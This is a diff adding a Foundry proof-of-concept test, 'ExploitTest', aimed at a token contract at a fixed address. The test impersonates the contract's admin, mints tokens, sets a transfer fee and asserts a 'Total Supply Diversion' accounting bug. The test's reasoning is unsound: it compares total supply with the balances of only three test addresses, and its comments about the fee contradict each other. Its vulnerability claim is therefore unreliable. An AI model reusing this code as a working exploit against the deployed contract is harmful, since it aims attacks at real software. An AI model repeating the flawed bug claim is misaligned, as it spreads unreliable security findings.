@@ -1,0 +1,84 @@
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.17;
+
+import "forge-std/Test.sol";
+
+interface IBLBToken {
+    function balanceOf(address account) external view returns (uint256);
+    function totalSupply() external view returns (uint256);
+    function transfer(address to, uint256 amount) external returns (bool);
+    function mint(address account, uint256 amount) external;
+    function setTransactionFee(uint256 _feeAmount, uint256 _feeFraction, address _feeReceiver) external;
+    function getRoleMember(bytes32 role, uint256 index) external view returns (address);
+    function hasRole(bytes32 role, address account) external view returns (bool);
+}
+
+contract ExploitTest is Test {
+    address constant TOKEN = 0x13D67Fd10BDBe8301E978e4AdCBD2c0AD26F7549;
+    bytes32 constant DEFAULT_ADMIN_ROLE = bytes32(0);
+    bytes32 constant MINTER_ROLE = keccak256("MINTER_ROLE");
+    bytes32 constant FEE_SETTER_ROLE = keccak256("FEE_SETTER_ROLE");
+    bytes32 constant FEE_FREE_ROLE = keccak256("FEE_FREE_ROLE");
+
+    IBLBToken token = IBLBToken(TOKEN);
+
+    function setUp() public {
+        vm.label(TOKEN, "BLBToken");
+    }
+
+    function testExploit() public {
+        // Get the admin who has all roles
+        address admin = token.getRoleMember(DEFAULT_ADMIN_ROLE, 0);
+        vm.label(admin, "Admin");
+
+        // Impersonate admin
+        vm.startPrank(admin);
+
+        // Mint tokens to a non-privileged user
+        address userA = address(0x1001);
+        address userB = address(0x2002);
+        address feeReceiver = address(0x3003);
+        uint256 mintAmount = 1_000_000 * 1e18;
+        token.mint(userA, mintAmount);
+        vm.stopPrank();
+
+        // Record pre‑state
+        uint256 totalSupplyBefore = token.totalSupply();
+        uint256 balanceA_Before = token.balanceOf(userA);
+        uint256 balanceB_Before = token.balanceOf(userB);
+        uint256 balanceFee_Before = token.balanceOf(feeReceiver);
+
+        // Admin sets a fixed fee of 1 token
+        vm.startPrank(admin);
+        token.setTransactionFee(1e18, 0, feeReceiver);
+        vm.stopPrank();
+
+        // UserA transfers a huge amount to userB
+        uint256 transferAmount = 100_000 * 1e18;
+        vm.prank(userA);
+        token.transfer(userB, transferAmount);
+
+        // Post‑state
+        uint256 totalSupplyAfter = token.totalSupply();
+        uint256 balanceA = token.balanceOf(userA);
+        uint256 balanceB = token.balanceOf(userB);
+        uint256 balanceFee = token.balanceOf(feeReceiver);
+        uint256 sumBalances = balanceA + balanceB + balanceFee;
+
+        // According to the vulnerability (TSD - Total Supply Diversion)
+        // the amount added to totalSupply does not equal the amount added to balances.
+        // This means totalSupplyAfter should differ from sumBalances.
+        // In a correct implementation they would be equal.
+        assertTrue(totalSupplyAfter != sumBalances, "Total supply equals sum of balances - bug not present");
+
+        // Additionally, the fee was taken but totalSupply was not reduced (since feeReceiver non‑zero)
+        // so the sum of balances lacks the fee amount relative to totalSupply.
+        assertEq(totalSupplyAfter, totalSupplyBefore, "Total supply should not change in a fee transfer");
+        // The fee is taken from userA and given to feeReceiver, but the main transfer also moves the full amount.
+        // The discrepancy arises because the fee transfer’s effect on total supply is incorrectly handled.
+        // Show that the sum of balances is less than totalSupply (the fee amount is lost in the sum)
+        assertEq(totalSupplyAfter - sumBalances, 1e18, "The difference should be exactly the fixed fee");
+    }
+}
+```
